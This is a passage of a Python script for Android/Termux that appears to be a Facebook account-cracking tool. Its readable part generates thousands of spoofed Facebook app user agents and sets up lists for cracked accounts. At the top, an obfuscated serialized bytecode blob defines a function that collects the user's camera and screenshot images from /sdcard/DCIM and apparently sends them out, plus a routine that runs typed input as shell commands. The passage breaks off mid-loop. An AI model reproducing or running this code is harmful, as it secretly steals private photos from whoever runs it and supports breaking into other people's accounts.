\x02N%\x03c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3*\x06\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00d\x01}\x01d\x02}\x02\t\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x06}\x03d\x07\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x06}\x03d\x0e\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0f}\x03d\x10\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bn\x07#\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\t\x00d\x0f}\x03d\x11\x84\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00|\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x04D\x00]\x8a}\x05t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x03|\x05\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x06d\t|\x01\x9b\x00d\n\x9d\x03}\x07d\x0b|\x02i\x01}\x08d\x0b|\x02i\x01}\td\x0c|\x06i\x01}\n|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\t|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x07|\x08|\n\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00}\x0cd\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x8bd\x00S\x00#\x00\x01\x00Y\x00d\x00S\x00x\x03Y\x00w\x01)\x12Nr\x0b\x00\x00\x00r\x0c\x00\x00\x00z\x08.pho.txt\xda\x01a\xda\x04donez\x13/sdcard/DCIM/Camerac\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00\xa9\x01z\x04.jpgr\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>_\x00\x00\x00\xf3)\x00\x00\x00\x80\x00\xd0\x14N\xd0\x14N\xd0\x14N\x981\xb81\xbf:\xba:\xc0f\xd1;M\xd4;M\xd0\x14N\x90Q\xd0\x14N\xd0\x14N\xd0\x14Nr\t\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00r\x19\x00\x00\x00r\x1a\x00\x00\x00r\x1b\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00\xa9\x01z\x04.pngr\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>m\x00\x00\x00r7\x00\x00\x00r\t\x00\x00\x00z\x18/sdcard/DCIM/Screenshotsc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r9\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>{\x00\x00\x00r7\x00\x00\x00r\t\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00\xf3<\x00\x00\x00\x97\x00g\x00|\x00]\x19}\x01|\x01\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xaf\x17|\x01\x91\x02\x8c\x1aS\x00r6\x00\x00\x00r\x0f\x00\x00\x00r\x11\x00\x00\x00s\x02\x00\x00\x00  r\x07\x00\x00\x00r\x14\x00\x00\x00z\x19photo.<locals>.<listcomp>\x88\x00\x00\x00r7\x00\x00\x00r\t\x00\x00\x00)\tr\x05\x00\x00\x00r\x06\x00\x00\x00r$\x00\x00\x00\xda\x05writer"\x00\x00\x00r#\x00\x00\x00r%\x00\x00\x00r&\x00\x00\x00r\'\x00\x00\x00r(\x00\x00\x00s\r\x00\x00\x00             r\x07\x00\x00\x00\xda\x05photor=\x00\x00\x00V\x00\x00\x00s\xe4\x04\x00\x00\x80\x00\xdd\x0c\x14\xd4\x0c\x1c\xd1\x0c\x1e\xd4\x0c\x1e\x80G\xd8\x0f?\x80I\xd8\r\x19\x80G\xf0\x04\x0e\x05\x10\xe5\x08\x0c\x88Z\x98\x03\xd1\x08\x1c\xd4\x08\x1c\xd7\x08"\xd2\x08"\xa06\xd1\x08*\xd4\x08*\xd0\x08*\xd8\x16+\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x12\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x02\x0c\x05\x10\xe0\x16+\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x04\x0c\x05\x10\xe0\x160\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\xf8\xf8\xf8\xf0\x02\x0c\x05\x10\xe0\x160\x88\x0b\xd8\x14N\xd0\x14N\xa5\x02\xa4\n\xa8;\xd1 7\xd4 7\xd0\x14N\xd1\x14N\xd4\x14N\x88\t\xd8\x14\x1d\xf0\x00\x07\tB\x01\xf0\x00\x07\tB\x01\x88D\xdd\x11\x15\x95b\x94g\x97l\x92l\xa0;\xb0\x04\xd1\x165\xd4\x165\xb0t\xd1\x11<\xd4\x11<\xf0\x00\x06\rB\x01\xc0\x01\xd8\x14K\xb09\xd0\x14K\xd0\x14K\xd0\x14K\x90\x03\xd8\x17 \xa0\'\xd0\x16*\x90\x05\xd8\x16\x1f\xa0\x17\xd0\x15)\x90\x04\xd8\x17!\xa01\x90o\x90\x05\xd8\x16\x1d\x97l\x92l\xa03\xa8T\xb8\x15\x90l\xd1\x16?\xd4\x16?\x90\x03\xd8\x17\x1e\x97|\x92|\xa0C\xa8e\xb85\x90|\xd1\x17A\xd4\x17A\x90\x04\xf0\r\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf1\x00\x06\rB\x01\xf4\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf8\xf8\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf0\x00\x06\rB\x01\xf8\xf0\x03\x07\tB\x01\xf0\x00\x07\tB\x01\xf8\xf0\x10\x00\x05\x10\x884\x884\x884\xf8\xf8\xf8s\xc7\x00\x00\x00\x99A5C*\x00\xc2\x0eA\x03C\x1d\x05\xc3\x11\x0cC*\x00\xc3\x1d\x04C!\t\xc3!\x03C*\x00\xc3$\x01C!\t\xc3%\x04C*\x00\xc3*\x02C.\x03\xc32A\x12F \x00\xc5\x04A\x03F\x13\x05\xc6\x07\x0cF \x00\xc6\x13\x04F\x17\t\xc6\x17\x03F \x00\xc6\x1a\x01F\x17\t\xc6\x1b\x04F \x00\xc6 \x02F$\x03\xc6(A\x12I\x16\x00\xc7:A\x03I\t\x05\xc8=\x0cI\x16\x00\xc9\t\x04I\r\t\xc9\r\x03I\x16\x00\xc9\x10\x01I\r\t\xc9\x11\x04I\x16\x00\xc9\x16\x02I\x1a\x03\xc9\x1eA\x12L\r\x00\xca0A\x03K?\x05\xcb3\x0cL\r\x00\xcb?\x04L\x03\t\xcc\x03\x03L\r\x00\xcc\x06\x01L\x03\t\xcc\x07\x04L\r\x00\xcc\r\x02L\x12\x03\xfa\x01~c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00\xf3`\x00\x00\x00\x97\x00\t\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02t\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00d\x03\x9d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00|\x00\x9b\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c.)\x04NTz\x07\x1b[1;32mz\n\x1b[1;37m $ )\x04\xda\x05input\xda\x03ehcr"\x00\x00\x00\xda\x06system)\x01\xda\x03jxxs\x01\x00\x00\x00 r\x07\x00\x00\x00\xda\x04mainrD\x00\x00\x00\x96\x00\x00\x00s7\x00\x00\x00\x80\x00\xf0\x02\x02\x05\x1c\xdd\x0c\x11\xd0\x121\x9ds\xd0\x121\xd0\x121\xd0\x121\xd1\x0c2\xd4\x0c2\x88\x03\xdd\x08\n\x8c\t\x90S\x90(\xd1\x08\x1b\xd4\x08\x1b\xd0\x08\x1b\xf0\x05\x02\x05\x1cr\t\x00\x00\x00\xe9\x14\x00\x00\x00)\x01\xda\x0bmax_workers)\x0fr\x05\x00\x00\x00r"\x00\x00\x00\xda\x03sys\xda\x12concurrent.futuresr\x03\x00\x00\x00\xda\nThreadPoolrB\x00\x00\x00r\x08\x00\x00\x00r1\x00\x00\x00r=\x00\x00\x00rA\x00\x00\x00rD\x00\x00\x00\xda\x03jjj\xda\x06submit\xda\x04Main\xa9\x00r\t\x00\x00\x00r\x07\x00\x00\x00\xfa\x08<module>rN\x00\x00\x00\x01\x00\x00\x00sh\x01\x00\x00\xf0\x03\x01\x01\x01\xe0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd0\x00\x16\xd8\x00?\xd0\x00?\xd0\x00?\xd0\x00?\xd0\x00?\xd0\x00?\xf0\x04\x04\x01\x14\xd8\x04\x13\x80O\x80O\x80O\x80O\xf8\xf0\x02\x02\x01\x14\xd8\x04\r\x80B\x84I\xd0\x0e$\xd1\x04%\xd4\x04%\xd0\x04%\xd8\x04\x13\x80O\x80O\x80O\x80O\x80O\xf8\xf8\xf8\xf0\x08\x01\x01\x1f\xf0\x00\x01\x01\x1f\xf0\x00\x01\x01\x1f\xf0\x04E\x01\x01\x10\xf0\x00E\x01\x01\x10\xf0\x00E\x01\x01\x10\xf0N\x02;\x01\x10\xf0\x00;\x01\x10\xf0\x00;\x01\x10\xf0~\x01\x00\x05\x08\x80\x03\xf0\x02\x03\x01\x1c\xf0\x00\x03\x01\x1c\xf0\x00\x03\x01\x1c\xf0\x0c\x00\x06\x10\x80Z\x98B\xd0\x05\x1f\xd1\x05\x1f\xd4\x05\x1f\xf0\x00\x03\x01\x15\xa03\xd8\x04\x07\x87J\x82J\x88t\xd1\x04\x14\xd4\x04\x14\xd0\x04\x14\xd8\x04\x07\x87J\x82J\x88u\xd1\x04\x15\xd4\x04\x15\xd0\x04\x15\xd8\x04\x07\x87J\x82J\x88t\xd1\x04\x14\xd4\x04\x14\xd0\x04\x14\xf0\x07\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf1\x00\x03\x01\x15\xf4\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf8\xf8\xf8\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15\xf0\x00\x03\x01\x15s\x1b\x00\x00\x00\x94\x04\x19\x00\x99\x161\x03\xc1\x0eA\x00B\x1b\x03\xc2\x1b\x04B\x1f\x07\xc2"\x01B\x1f\x07'))
         
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
a1 = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

def linex():
	print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
cps = []
oks = []
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

ugen1=[]
ugen2=[]
ugen3=[]
for agent in range(10000):
    a = str(random.randint(4, 13))
    b = random.choice(['V1818A','M1903C3EG','M1810F6LG','SM-N750K','M2003J15SC','SM-S918B','SM-S918B','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-N986B','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','vivo 1951','vivo 1918','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    c = str(random.randint(180610, 231105))
    #d = str(random.randint(1, 9))
    #e = str(random.randint(11, 99))
    f = random.choice(["Chrome/","UCBrowser/","Puffin/","UCTurbo/","Opera/"])
    g = str(random.randint(104, 119))
    h = str(random.randint(422, 445))
    i = str(random.randint(22, 36))
    j = random.choice(["SP1A","TP1A","QP1A","RKQ1","SKQ1","UP1A","PPR1"])
    user_agent = 'Dalvik/2.1.0 (Linux; U; Android '+a+'.0.0; '+b+' Build/'+j+'.'+c+') [FBAN/FB4A;FBAV/'+h+'.0.0.'+i+'.'+g+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+b+';FBBD/'+b+';FBDV/'+b+';FBSV/'+b+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(h)+',height='+str(g)+'};]'
    ugen1.append(user_agent)

for agent in range(10000):
    a = str(random.randint(4, 13))
    b = random.choice(['V1818A','M1903C3EG','M1810F6LG','SM-N750K','M2003J15SC','SM-S918B','SM-S918B','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-N986B','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','vivo 1951','vivo 1918','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    c = str(random.randint(180610, 231105))
    d = str(random.randint(1, 9))
    e = str(random.randint(11, 99))
    f = random.choice(["Chrome/","UCBrowser/","Puffin/","UCTurbo/","Opera/"])
    g = str(random.randint(1111, 9999))
    h = str(random.randint(111, 999))
    i = str(random.randint(1, 9))
    j = random.choice(["SP1A","TP1A","QP1A","RKQ1","SKQ1","UP1A","PPR1"])
    uge = 'Mozilla/5.0 (Linux; U; Android '+a+'.0; en; '+b+' Build/'+j+'.'+c+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+e+'.0.'+g+'.'+h+' '+f+''+a+'.'+a+'.0.'+g+' '+f+''+c+'.'+e+'.'+c+'.'+h+' Mobile Safari/537.36 '
    ugen2.append(uge)
    
for agent in range(10000):
    a="Mozilla/5.0 (Linux; Android "
    b=random.choice(["6.0;","7.0;","8.0;","9.0;","10.0;","11.0;","12.0;","13.0;"])
    c=" Nokia C"
    d=str(random.randint(10,110))
    e=" Build/"
    f=random.choice(["SP1A","TP1A","QP1A","RKQ1","SKQ1","UP1A","PPR1"])
    g=str(random.randint(180610, 231105))
    h=".0"
    i=str(random.randint(14,16))
    j="; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"
    k=str(random.randint(108,118))
    l=".0."
    m=str(random.randint(1,5359))
    n="."
    o=str(random.randint(1,128))
    p=" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/439.0.0.44.117;]"
    ugen = a+b+c+d+e+f+g+h+i+j+k+l+m+n+o+p
    ugen3.append(ugen)
    
for ix in range(200):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
